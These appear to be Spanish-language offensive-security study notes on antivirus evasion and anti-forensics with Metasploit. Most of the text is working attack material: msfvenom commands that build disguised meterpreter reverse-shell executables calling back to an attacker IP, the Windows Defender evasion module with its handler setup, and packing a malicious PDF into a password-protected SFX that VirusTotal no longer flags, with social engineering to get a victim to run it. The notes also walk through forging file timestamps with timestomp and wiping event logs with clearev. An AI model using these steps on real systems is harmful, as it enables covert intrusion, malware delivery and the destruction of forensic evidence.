# Evasión de antivirus y antiforense

## Evasión de Detección en Payloads de Metasploit Mediante Técnicas de Encoding

La efectividad de las operaciones ofensivas en ciberseguridad a menudo depende de la capacidad de un payload para evadir los sistemas de detección, particularmente las soluciones antivirus (AV). Mientras que `msfvenom` es una utilidad fundamental para la generación de payloads, la implementación directa de estos sin técnicas de ofuscación resulta en altas tasas de detección. Este documento explora la aplicación y el impacto de los encoders de `msfvenom` como estrategia principal para mitigar la detección por parte de los motores antivirus.
### 1. Concepto y Necesidad de los Encoders

Los encoders son algoritmos diseñados para transformar el código de un payload de manera que su firma (signature) sea alterada, dificultando su identificación por parte de los sistemas de detección basados en firmas. Sin esta transformación, los payloads genéricos son trivialmente detectados.

**Ejemplo Práctico: Generación de Payload sin Encoder de mútliples iteraciones**

Para ilustrar la detección inicial, se genera un payload `windows/meterpreter/reverse_tcp` utilizando el encoder `x86/shikata_ga_nai` con una sola iteración. Este payload, compilado como un ejecutable de Windows, se configura para establecer una conexión inversa a `192.168.44.134` en el puerto `8080`.

**Comando de Generación:**

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.44.134 LPORT=8080 -e x86/shikata_ga_nai -i 1 -f exe -o /root/Desktop/apache-update.exe
```

**Resultado de Generación (Ejemplo de `image_75f483.png`):**

```bash
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai chosen with final size 360
Payload size: 360 bytes
Final size of exe file: 73802 bytes
Saved as: /root/Desktop/apache-update.exe
```

_Este output confirma la generación exitosa del ejecutable `apache-update.exe` con un payload de 360 bytes, encapsulado en un archivo de 73802 bytes._

### 2. Evaluación de la Detección Antivirus (AV)

La plataforma VirusTotal es una herramienta indispensable para evaluar la tasa de detección de un payload. VirusTotal analiza archivos utilizando múltiples motores antivirus de diversos proveedores, proporcionando una vista integral de su detectabilidad.

**Ejemplo Práctico: Análisis de Payload en VirusTotal (Primera Iteración)**

Tras generar el payload inicial, se procede a su análisis en `http://www.virustotal.com`.

**Resultado del Análisis (Ejemplo de `image_75f72f.png`):**

```bash
Detection ratio: 45 / 60
```

_Este resultado, con una tasa de detección de 45 de 60 motores AV, subraya la ineficacia de una única iteración de encoding para evadir la detección generalizada. Un payload con esta tasa de detección es altamente propenso a ser neutralizado antes de lograr su objetivo._

### 3. Técnicas Avanzadas de Encoding para Evasión de AV

La baja efectividad inicial de los encoders básicos requiere la implementación de estrategias más sofisticadas, como la iteración múltiple y la experimentación con diferentes algoritmos de encoding.

#### 3.1 Iteraciones Múltiples del Encoder

La repetición del proceso de encoding múltiples veces puede alterar aún más la firma del payload, haciendo que sea más difícil de detectar para los motores AV basados en firmas.

**Ejemplo Práctico: Generación con 10 Iteraciones de `shikata_ga_nai`**

Se regenera el mismo payload, pero esta vez aplicando el encoder `x86/shikata_ga_nai` con 10 iteraciones (`-i 10`).

**Comando de Generación:**

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.44.134 LPORT=8080 -e x86/shikata_ga_nai -i 10 -f exe -o /root/Desktop/apache-update.exe
```

**Resultado de Generación (Ejemplo de `image_75f72c.png`):**

```bash
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai succeeded with size 387 (iteration=1)
...
x86/shikata_ga_nai chosen with final size 603
Payload size: 603 bytes
Final size of exe file: 73802 bytes
Saved as: /root/Desktop/apache-update.exe
```

_Observamos que el tamaño final del payload ha aumentado a 603 bytes debido a las múltiples capas de encoding. Sin embargo, el tamaño del archivo ejecutable se mantiene, lo que indica que el overhead del encoder se integra eficientemente._

**Ejemplo Práctico: Análisis en VirusTotal (10 Iteraciones de `shikata_ga_nai`)**

El payload recién generado se somete nuevamente a análisis en VirusTotal.

**Resultado del Análisis (Ejemplo de `image_75f728.jpg`):**

```bash
Detection ratio: 46 / 60
```

_Sorprendentemente, la tasa de detección ha aumentado marginalmente a 46 de 60. Esto sugiere que para ciertos encoders y firmas AV, la iteración excesiva no siempre se traduce en una menor detectabilidad, e incluso puede introducir nuevas firmas detectables._

#### 3.2 Cambio de Encoder y Iteraciones Adicionales

La persistencia de una alta tasa de detección con `shikata_ga_nai` requiere la experimentación con encoders alternativos. El encoder `x86/opt_sub` es otra opción que puede ofrecer diferentes características de ofuscación.

**Ejemplo Práctico: Generación con `opt_sub` y 5 Iteraciones**

Se genera el payload utilizando el encoder `x86/opt_sub` con 5 iteraciones (`-i 5`).

**Comando de Generación:**

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.44.134 LPORT=8080 -e x86/opt_sub -i 5 -f exe -o /root/Desktop/apache-update1.exe
```

**Resultado de Generación (Ejemplo de `image_75f748.png`):**

```bash
Attempting to encode payload with 5 iterations of x86/opt_sub
x86/opt_sub succeeded with size 1373 (iteration=0)
x86/opt_sub succeeded with size 5533 (iteration=1)
...
x86/opt_sub chosen with final size 354973
Payload size: 354973 bytes
Final size of exe file: 430880 bytes
Saved as: /root/Desktop/apache-update1.exe
```

_Este cambio de encoder y las iteraciones adicionales resultan en un tamaño de payload significativamente mayor (354973 bytes) y un tamaño de archivo ejecutable de 430880 bytes, lo que indica una transformación más profunda del binario._

**Ejemplo Práctico: Análisis en VirusTotal (`opt_sub` con 5 Iteraciones)**

El payload generado con `opt_sub` se analiza en VirusTotal.

**Resultado del Análisis (Ejemplo de `image_75f74c.png`):**

```bash
Detection ratio: 25 / 60
```

_Este resultado representa una mejora sustancial, con una tasa de detección que se reduce a 25 de 60. Esto valida la importancia de la experimentación con diferentes algoritmos de encoding y la combinación de estos con múltiples iteraciones._

### 4. Consideraciones Críticas y Mejores Prácticas

La evasión de AV es un campo en constante evolución, y no existe una "receta secreta" universal.

- **Proceso Iterativo de Trial-and-Error:** La creación de payloads indetectables es un proceso iterativo que requiere probar diversas permutaciones y combinaciones de encoders e iteraciones. La reducción de la tasa de detección a un nivel aceptable es el objetivo principal.
- **Riesgo de Corrupción del Payload:** Es fundamental tener en cuenta que un número excesivo de iteraciones o la aplicación de encoders incompatibles pueden corromper la funcionalidad del payload original.
- **Verificación Previa a la Implementación:** Antes de desplegar un payload en un entorno objetivo real, es imperativo realizar pruebas exhaustivas en un entorno controlado (sandbox o máquina virtual). Esto garantiza que el payload no solo sea indetectable, sino que también funcione como se espera y establezca la conexión deseada.

## Evasión de Detección en Metasploit 5.0: El Módulo `evasion/windows/windows_defender_exe`

En operaciones de seguridad ofensiva, la capacidad de un payload para eludir la detección por parte de las soluciones antivirus (AV) es crucial. Mientras que los encoders de `msfvenom` ofrecen una capa de ofuscación, el Metasploit Framework 5.0 introduce un **módulo de evasión** específico (`evasion/windows/windows_defender_exe`) diseñado para generar ejecutables (EXE) que evaden activamente la detección de Microsoft Windows Defender. Este módulo integra múltiples técnicas avanzadas para lograr este objetivo.

### 1\. Introducción al Módulo de Evasión

El módulo `evasion/windows/windows_defender_exe` es una herramienta especializada que facilita la creación de binarios evasivos para sistemas operativos Windows. Su funcionalidad se basa en la combinación de diversas técnicas de ofuscación y anti-análisis para neutralizar las capacidades de detección de Windows Defender.

#### 1.1 Funcionalidades y Descripción Técnica

Este módulo genera un ejecutable de Windows que emplea un conjunto de técnicas sofisticadas para eludir el antivirus nativo de Microsoft. Estas técnicas incluyen:

  * **Cifrado de Shellcode:** Ofusca el shellcode incrustado, dificultando el análisis estático y la detección basada en firmas.
  * **Ofuscación del Código Fuente (`Metasm`):** Utiliza la biblioteca Metasm para transformar el código en un nivel intermedio, haciendo que el análisis del código compilado sea más complejo para las herramientas de seguridad.
  * **Técnicas Anti-Emulación:** Incorpora mecanismos que detectan si el payload está siendo ejecutado en un entorno emulado (sandboxes, máquinas virtuales de análisis de malware) y modifica su comportamiento para evitar ser analizado por completo.

El objetivo principal es generar un binario que sea lo suficientemente sigiloso como para pasar desapercibido, al menos en la fase inicial de despliegue.

**Ejemplo Práctico: Carga y Consulta de Información del Módulo**

Para iniciar, se accede a la `msfconsole` y se carga el módulo. La información detallada sobre sus capacidades se obtiene con el comando `info`.

**Comandos:**

```bash
msf > use evasion/windows/windows_defender_exe
msf evasion(windows/windows_defender_exe) > info
```

**Salida de Información (Ejemplo de `image_7660a6.png`):**

```bash
       Name: Microsoft Windows Defender Evasive Executable
     Module: evasion/windows/windows_defender_exe
   Platform: Windows
       Arch: x86
   Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  sinn3r <sinn3r@metasploit.com>

Check supported:
  No

Basic options:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME                   yes       Filename for the evasive file (default: random)

Description:
  This module allows you to generate a Windows EXE that evades against
  Microsoft Windows Defender. Multiple techniques such as shellcode
  encryption, source code obfuscation, Metasm, and anti-emulation are
  used to achieve this. For best results, please try to use payloads
  that use a more secure channel such as HTTPS or RC4 in order to
  avoid the payload network traffic getting caught by antivirus
  better.
```

*La descripción técnica resalta el uso de cifrado, ofuscación y anti-emulación. Adicionalmente, se recomienda utilizar payloads con canales de comunicación seguros (HTTPS, RC4) para evitar la detección basada en el tráfico de red del payload, lo cual es una consideración crítica post-evasión del binario.*

### 2\. Configuración y Generación del Payload Evasivo

La configuración del módulo de evasión implica la definición del nombre del archivo de salida y la selección del payload a incrustar.

#### 2.1 Parámetros del Módulo

El módulo requiere la configuración de parámetros específicos antes de la generación del ejecutable evasivo.

  * **`FILENAME`**: Este es el único parámetro fundamental para el módulo `evasion/windows/windows_defender_exe`. Define el nombre del archivo de salida del ejecutable evasivo. Si no se especifica, se asignará un nombre aleatorio por defecto.

**Ejemplo Práctico: Verificación de Opciones del Módulo**

Para visualizar las opciones configurables, se utiliza el comando `show options`.

**Comando:**

```bash
msf evasion(windows/windows_defender_exe) > show options
```

**Salida (Ejemplo Parcial de `image_7660c0.png` - Sección "Module options"):**

```
Module options (evasion/windows/windows_defender_exe):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME                   yes       Filename for the evasive file (default: random)
```

*Esta salida confirma que `FILENAME` es la única opción de configuración directa del módulo de evasión.*

#### 2.2 Configuración del Payload Interno

Además de las opciones del módulo de evasión, es imperativo seleccionar y configurar un payload de Metasploit que será incrustado en el ejecutable evasivo. Para una mayor sigilo y estabilidad en entornos modernos, se recomienda el uso de payloads HTTPS.

  * **`PAYLOAD`**: Especifica el tipo de payload de Metasploit a encapsular. Para un canal de comunicación más seguro, `windows/meterpreter/reverse_https` es una elección robusta.
  * **`LHOST`**: Define la dirección IP del atacante (la máquina Kali Linux en este escenario) a la cual el payload intentará conectarse una vez ejecutado en el sistema objetivo.
  * **`LPORT`**: Define el puerto de escucha en la máquina del atacante. Para `reverse_https`, el puerto por defecto es 8443, lo que proporciona una apariencia de tráfico cifrado legítimo.

**Ejemplo Práctico: Configuración del Payload y Generación**

Se configura el payload `windows/meterpreter/reverse_https` y se establece la dirección IP del LHOST.

**Comandos:**

```bash
msf evasion(windows/windows_defender_exe) > set PAYLOAD windows/meterpreter/reverse_https
msf evasion(windows/windows_defender_exe) > set LHOST 192.168.25.129
msf evasion(windows/windows_defender_exe) > set FILENAME LSO.exe # Asignamos un nombre específico
msf evasion(windows/windows_defender_exe) > show options # Para verificar la configuración
```

**Salida (Ejemplo de `image_7660c0.png` - Sección "Payload options"):**

```
Payload options (windows/meterpreter/reverse_https):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   EXITFUNC     process          yes       Exit technique (Accepted: '', seh, thread, process,
   LHOST        192.168.25.129   yes       The local listener hostname
   LPORT        8443             yes       The local listener port
   LURI                          no        The HTTP Path
```

Una vez que todas las opciones están debidamente configuradas, la generación del ejecutable evasivo se realiza mediante el comando `exploit`.

**Comando:**

```bash
msf evasion(windows/windows_defender_exe) > exploit
```

**Resultado de Generación (Ejemplo de `image_7660c0.png`):**

```
[+] Compiled executable size: 4608
[+] LSO.exe stored at /root/.msf4/local/LSO.exe
```

*Este output confirma que un ejecutable `LSO.exe` con un tamaño de 4608 bytes ha sido compilado y guardado en la ruta `/root/.msf4/local/`. Este archivo está ahora listo para ser transferido al sistema objetivo Windows.*

### 3\. Establecimiento del Handler para Conexión Inversa

Para recibir la conexión de retorno (`reverse_https`) del payload una vez ejecutado en el sistema objetivo, es imprescindible configurar un `handler` en Metasploit.

**Comandos:**

```bash
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
msf exploit(multi/handler) > set LHOST 192.168.25.129 # Debe coincidir con el LHOST del payload
msf exploit(multi/handler) > set LPORT 8443 # Debe coincidir con el LPORT del payload
msf exploit(multi/handler) > exploit # O 'run'
```

*Una vez que el handler esté activo y en escucha, el sistema está preparado para recibir la sesión de Meterpreter cuando el ejecutable `LSO.exe` sea ejecutado en la máquina víctima.*

## Ofuscación y Evasión de Detección en Payloads Maliciosos mediante Empaquetadores y Cifradores

### 1. Introducción a las Técnicas de Evasión de Antivirus

En el ámbito de la ciberseguridad ofensiva, la **evasión de detección por parte de los sistemas antivirus (AV)** es un desafío persistente. Si bien diversas técnicas de _encoding_ y _obfuscation_ pueden dificultar el análisis estático de _payloads_, a menudo persisten umbrales de detección. Este documento detalla la aplicación de utilidades de compresión y cifrado, específicamente **7-Zip**, para incrementar la tasa de indetectabilidad de archivos maliciosos.

### 2. Metodología de Pruebas y Evaluación

Para demostrar la efectividad de las técnicas propuestas, se empleará la plataforma **VirusTotal** como herramienta de análisis multicapa. VirusTotal agrega resultados de múltiples motores antivirus, proporcionando una visión integral sobre la detectabilidad de un archivo.

#### 2.1. Baseline de Detección: PDF Malicioso Inicial

Como punto de partida, se utiliza un archivo PDF que integra un _payload_ malicioso. Este archivo se somete a un análisis inicial en VirusTotal.

- **Ejemplo Práctico:** Se carga el archivo `BankStatement.pdf` a `http://www.virustotal.com`.
- **Resultados de Análisis (Referencia: Figura 8.9 – Scanning a payload using 'virustotal'):** La tasa de detección inicial fue de **32/56**, lo que indica que 32 de los 56 motores antivirus disponibles identificaron el archivo como malicioso.

### 3. Aplicación de Archivos Autoextraíbles (SFX)

Una técnica para reducir la detectabilidad es encapsular el _payload_ dentro de un archivo autoextraíble (SFX). Esta técnica altera la firma del archivo y puede dificultar el análisis heurístico por parte de algunos motores AV.

#### 3.1. Creación de un Archivo SFX sin Cifrado

Utilizando la utilidad 7-Zip, se convierte el archivo PDF malicioso en un ejecutable SFX.

- **Ejemplo Práctico:**
    1. Abrir 7-Zip File Manager.
    2. Seleccionar `BankStatement.pdf`.
    3. Hacer clic en "Add to Archive...".
    4. En "Archive format", seleccionar `7z`.
    5. En "Options", marcar la casilla "Create SFX archive".
    6. Confirmar la creación del archivo `BankStatement.exe`. (Referencia: Figura 8.10 – Using 7-Zip to create an SFX archive)
- **Resultados de Análisis** Tras el escaneo en VirusTotal, la detectabilidad del archivo SFX se redujo a **21/59**. Aunque sigue siendo detectado por una cantidad considerable de motores, representa una mejora significativa respecto al PDF original (32/56).

### 4. Implementación de Cifrado AES-256 en Archivos SFX

Para lograr una mayor **sigilosidad (stealthiness)**, se introduce una capa de cifrado simétrico mediante **AES-256** en el archivo SFX. El cifrado impide que los motores antivirus realicen un análisis estático del _payload_ incrustado sin la clave de descifrado.

#### 4.1. Creación de un Archivo SFX con Protección por Contraseña

Se utiliza nuevamente 7-Zip para generar un archivo SFX que, además de ser autoextraíble, requiere una contraseña para su descompresión.

- **Ejemplo Práctico:**
    1. Repetir los pasos para crear un archivo SFX con 7-Zip.
    2. En la sección "Encryption", introducir una contraseña robusta en los campos "Enter password" y "Reenter password".
    3. Asegurarse de que el "Encryption method" sea **AES-256**.
    4. Es **crucial** no marcar "Encrypt file names" si se desea que el nombre del archivo se muestre antes de la descompresión. (Referencia: Figura 8.11 – Using 7-zip to create an SFX archive)
- **Resultados de Análisis (Referencia: Figura 8.12 – Scanning a payload using 'virustotal'):** Tras subir el archivo SFX cifrado a VirusTotal, la tasa de detección fue de **0/61**. Esto indica una indetectabilidad completa por parte de todos los motores antivirus en el momento del análisis.

### 5. Implicaciones Operacionales

La implementación de un _payload_ autoextraíble y cifrado mejora drásticamente su capacidad para evadir la detección durante la fase de tránsito. Sin embargo, la inclusión de una contraseña introduce una barrera adicional para la ejecución por parte del usuario final (la víctima), requiriendo ingeniería social para inducir al usuario a introducir la contraseña.

## El Sandbox en el Análisis de Malware y Seguridad Informática

### 1. Interacción de Aplicaciones con el Sistema Operativo Huésped

Al ejecutar cualquier aplicación, ya sea de naturaleza legítima o maliciosa, se desencadenan una serie de interacciones fundamentales con el sistema operativo (SO) huésped. Estas interacciones son inherentes al ciclo de vida de un proceso y pueden alterar el estado del sistema. Entre los eventos más comunes y significativos se incluyen:

- **Interacción Directa con el SO Huésped:** La aplicación establece un vínculo directo con el _kernel_ y los componentes del sistema operativo.
- **Realización de Llamadas al Sistema (Syscalls):** Las aplicaciones solicitan servicios al _kernel_ a través de _syscalls_ para realizar operaciones de bajo nivel (ej. acceso a archivos, gestión de memoria, creación de procesos).
- **Establecimiento de Conexiones de Red:** Las aplicaciones pueden iniciar o aceptar comunicaciones a través de la pila de red (ej. TCP/IP, UDP) para acceder a recursos remotos o comunicarse con otros sistemas.
- **Modificación de Entradas del Registro del Sistema:** En sistemas Windows, las aplicaciones pueden añadir, modificar o eliminar claves y valores en el registro, afectando la configuración del sistema o de otras aplicaciones.
- **Escritura de Registros de Eventos (Event Logs):** Las acciones y estados de la aplicación pueden ser registrados en los _logs_ del sistema para auditoría o depuración.
- **Creación y Eliminación de Archivos Temporales:** Durante su ejecución, las aplicaciones frecuentemente generan archivos temporales para almacenar datos transitorios.
- **Generación de Nuevos Procesos (Process Spawning):** Una aplicación puede lanzar la ejecución de otros programas o scripts.
- **Actualización de Archivos de Configuración:** Los parámetros de operación de la aplicación o del sistema pueden ser modificados en archivos de configuración persistentes.

Es crucial entender que todas estas operaciones tienen un carácter persistente y modifican el estado inherente del sistema objetivo.

### 2. Concepto y Utilidad del Sandbox

En escenarios donde se requiere analizar el comportamiento de un programa, especialmente de _malware_, de una manera controlada y sin riesgo de afectar el entorno de prueba, la implementación de un **sandbox** es indispensable.

#### 2.1. Definición Operacional del Sandbox

Un sandbox puede conceptualizarse como un **entorno de ejecución aislado y hermético**, análogo a un **contenedor** o **compartimento virtual**. Su principio fundamental es garantizar que cualquier actividad llevada a cabo dentro de sus límites permanezca confinada, sin impactar el sistema operativo huésped o la infraestructura circundante.

#### 2.2. Rol del Sandbox en el Análisis de Malware

La ejecución de una muestra de _payload_ dentro de un sandbox permite a los analistas observar y documentar su comportamiento de manera segura. Esto incluye el registro de _syscalls_, conexiones de red, modificaciones de registro, actividad de archivos y creación de procesos, todo ello sin comprometer la integridad o el estado del sistema de análisis.

- **Ejemplo Práctico:** Supongamos que un equipo de seguridad recibe un archivo ejecutable sospechoso. En lugar de ejecutarlo directamente en una estación de trabajo de análisis, se podría lanzar dentro de un sandbox. Durante su ejecución, el sandbox registraría si el _malware_ intenta:
    - Conectarse a un Centro de Comando y Control (C2).
    - Cifrar archivos en el disco.
    - Inyectar código en otros procesos.
    - Crear una entrada de persistencia en el registro. Una vez finalizado el análisis, el entorno del sandbox se puede revertir a su estado inicial, eliminando cualquier rastro del _malware_ sin afectar el sistema real.

### 3. Frameworks de Sandbox de Código Abierto

Existen diversas soluciones de sandbox, tanto comerciales como de código abierto, que facilitan el análisis dinámico de _malware_. A continuación, se presentan dos ejemplos notables de frameworks de código abierto ampliamente utilizados:

- **Sandboxie:** `https://www.sandboxie.com`
    
    - **Funcionalidad:** Permite la ejecución de programas en un espacio aislado para prevenir cambios permanentes en el sistema. Es particularmente útil para la navegación web segura o la ejecución de aplicaciones no confiables.
    - **Ejemplo de Aplicación:** Un investigador podría utilizar Sandboxie para abrir un documento de Word con macros sospechosas. Cualquier modificación que las macros intenten realizar en el sistema (ej. descarga de _payloads_ adicionales, modificación del registro) quedaría confinada dentro del entorno de Sandboxie y sería reversible.
- **Cuckoo Sandbox:** `https://cuckoosandbox.org/`
    
    - **Funcionalidad:** Es un sistema de análisis de malware automatizado y extensible. Permite el envío de archivos y URLs para un análisis exhaustivo en entornos virtualizados, capturando _syscalls_, tráfico de red y comportamientos de archivo.
    - **Ejemplo de Aplicación:** Un laboratorio de _threat intelligence_ podría integrar Cuckoo Sandbox en su flujo de trabajo para automatizar el análisis de miles de muestras de _malware_ diarias. Cuckoo generaría informes detallados sobre el comportamiento de cada muestra, incluyendo hashes, indicadores de compromiso (IoCs) y un volcado de red (_PCAP_), sin intervención manual y con la capacidad de resetear el entorno de análisis automáticamente para la siguiente muestra.


## Técnicas Anti-Forenses Post-Explotación con Metasploit Framework

### 1. Relevancia de las Técnicas Anti-Forenses en Compromisos Sistémicos

En la última década, las **tecnologías forenses digitales** han experimentado avances significativos, madurando en herramientas y metodologías para la búsqueda, análisis y preservación de evidencia digital en casos de brechas de seguridad, fraudes o incidentes. Si bien el **Metasploit Framework** es una plataforma robusta para la explotación y compromiso de sistemas remotos, el _payload_ **Meterpreter** opera predominantemente _in-memory_ a través de inyección de DLLs, minimizando la escritura en disco a menos que sea explícitamente requerido. Sin embargo, durante una fase de post-explotación, las interacciones con el sistema de archivos remoto (ej. creación, modificación o eliminación de archivos) son operaciones comunes que inevitablemente dejan rastros forenses.

El éxito de una intrusión no solo radica en la capacidad de comprometer un sistema, sino también en la habilidad de **mantener la persistencia y el sigilo**, asegurando que el compromiso permanezca indetectado, incluso bajo un escrutinio forense. Afortunadamente, Metasploit integra utilidades diseñadas para mitigar la trazabilidad de las acciones del atacante, reduciendo la evidencia forense en el sistema comprometido.

En las secciones subsiguientes, exploraremos dos utilidades clave: **Timestomp** y **Clearev**.

### 2. Manipulación de Metadatos de Archivos con Timestomp

Cada archivo y directorio en un sistema de archivos, independientemente del sistema operativo, posee **metadatos** asociados. Estos metadatos son propiedades intrínsecas que incluyen, pero no se limitan a:

- **Timestamps (MACE):** Fechas y horas de Creación (Creation), Acceso (Access), Modificación (Modification) y Entrada de registro MFT modificada (Entry modified).
- **Tamaño en disco:** Espacio que el archivo ocupa.
- **Información de Propiedad:** Identificador del usuario o grupo propietario.
- **Atributos de archivo:** Ej. lectura-escritura, oculto, de sistema.

En el contexto de una investigación forense, estos metadatos pueden ser una fuente crítica de información, permitiendo a los analistas reconstruir la línea de tiempo de un ataque. Adicionalmente, existen programas de seguridad, como los **monitores de integridad de archivos (FIM)**, que supervisan activamente los cambios en los archivos, y las alteraciones en los _timestamps_ podrían activar una alarma.

Cuando se obtiene una _Meterpreter shell_ y se interactúa con el sistema de archivos remoto (ej. creación de nuevos archivos, modificación de existentes), los _timestamps_ de los metadatos se actualizan automáticamente, creando potenciales indicadores de compromiso (IoC) para los forenses. La utilidad **Timestomp** en Meterpreter está diseñada para **sobrescribir los valores de _timestamp_** de cualquier archivo o directorio, permitiendo al atacante establecer fechas y horas arbitrarias, y así ofuscar la actividad real.

- **Sintaxis y Opciones de Timestomp:**
    
     ![[Adjuntos/Pasted image 20250621131705.png]]
    - **Opciones Clave:**
        - `-a <opt>`: Establece la hora de "último acceso" del archivo.
        - `-c <opt>`: Establece la hora de "creación" del archivo.
        - `-m <opt>`: Establece la hora de "última escritura" (modificación) del archivo.
        - `-e <opt>`: Establece la hora de "entrada MFT modificada".
        - `-z <opt>`: Establece los cuatro atributos MACE (Modificación, Acceso, Creación, Entrada MFT modificada) del archivo.
- **Ejemplo Práctico de Manipulación de Timestamps:**
    
    1. **Estado Inicial:** Considérese un archivo `Confidential.txt` en el sistema objetivo. Antes de la manipulación, sus propiedades muestran _timestamps_ originales. 
       ![[Adjuntos/Pasted image 20250621131754.png]]
    2. **Explotación y Obtención de Meterpreter:** Se explota una vulnerabilidad, como `SMB MS08_67_netapi`, para obtener una _Meterpreter shell_ en el sistema objetivo. 
       ![[Adjuntos/Pasted image 20250621131820.png]]
    3. **Uso de Timestomp:** Dentro de la sesión Meterpreter, se ejecuta el comando `timestomp` para modificar los _timestamps_ del archivo `Confidential.txt`.
        - **Comando:** `timestomp Confidential.txt -c "02/10/2014 10:10:10"`
        - **Objetivo:** Modificar la fecha de creación a una fecha anterior (2 de octubre de 2014, 10:10:10 AM).
          ![[Adjuntos/Pasted image 20250621131836.png]]
    4. **Verificación Post-Modificación:** Al revisar las propiedades del archivo `Confidential.txt` en el sistema comprometido, se observan los _timestamps_ alterados. (Referencia: Figura 8.16 – Checking file properties using the timestamp - Muestra "Created: Thursday, October 02, 2014, 10:10:10 AM")

Mediante Timestomp, se logra una efectiva ofuscación de la línea de tiempo de la actividad del atacante.

### 3. Eliminación de Registros de Eventos con Clearev

Los sistemas operativos Windows registran la mayoría de las acciones y eventos en los **Registros de Eventos (Event Logs)**. Estos registros se clasifican principalmente en tres categorías:

- **Registros de Aplicación (Application Logs):** Contienen eventos generados por aplicaciones instaladas, como inicios, cierres o errores.
- **Registros de Seguridad (Security Logs):** Almacenan eventos relacionados con la seguridad, como intentos de inicio de sesión exitosos o fallidos, cambios de privilegios y accesos a objetos.
- **Registros del Sistema (System Logs):** Contienen eventos relacionados con el funcionamiento del sistema operativo, incluyendo arranques, reinicios, errores de hardware o software.

En el caso de un incidente de seguridad o una falla del sistema, los registros de eventos son a menudo las primeras fuentes consultadas por investigadores o administradores para comprender lo sucedido.

Consideremos un escenario en el que se ha comprometido un host Windows, se han subido archivos, se han escalado privilegios y se ha intentado añadir un nuevo usuario. Todas estas acciones se registrarían en los _event logs_, dejando un rastro claro de la intrusión. Para evitar la detección, Meterpreter proporciona la utilidad **Clearev**, diseñada para eliminar de forma sistemática estos registros.

- **Visualización de Registros de Eventos (Estado Inicial):**
    
    - La siguiente imagen muestra la aplicación **Visor de Eventos de Windows**, donde se almacenan y visualizan todos los registros: ![[Adjuntos/Pasted image 20250621132027.png]]
- **Ejemplo Práctico de Borrado de Registros con Clearev:**
    
    1. **Compromiso y Acceso a Meterpreter:** Se obtiene acceso a una _Meterpreter shell_ en el sistema Windows comprometido, por ejemplo, utilizando la vulnerabilidad `SMB MS08_67_netapi`. 
       ![[Adjuntos/Pasted image 20250621132050.png]]
    2. **Ejecución de Clearev:** Dentro de la sesión Meterpreter, se ejecuta el comando `clearev`.
        - **Comando:** `clearev`
        - **Acción:** Este comando instruye a Meterpreter para que acceda y borre las entradas de los registros de Aplicación, Seguridad y Sistema en el host comprometido. 
        - **Nota Técnica:** El mensaje `stdapi_sys_eventlog_open: Operation failed: 1314` indica que, aunque se intentó limpiar los _event logs_, hubo un fallo en la operación para algunos (posiblemente por permisos o porque el log ya estaba vacío). Sin embargo, los mensajes `Wiping X records from Application...` y `Wiping X records from System...` confirman que la operación tuvo éxito para una gran cantidad de entradas.
    3. **Verificación Post-Limpieza:** Al regresar al Visor de Eventos en el sistema Windows comprometido, se verifica que la mayoría de los registros han sido eliminados. 
       ![[Adjuntos/Pasted image 20250621132108.png]]

En síntesis, `clearev` dentro de Meterpreter es una herramienta eficaz para erradicar las huellas digitales de la actividad del atacante en los registros de eventos del sistema objetivo.
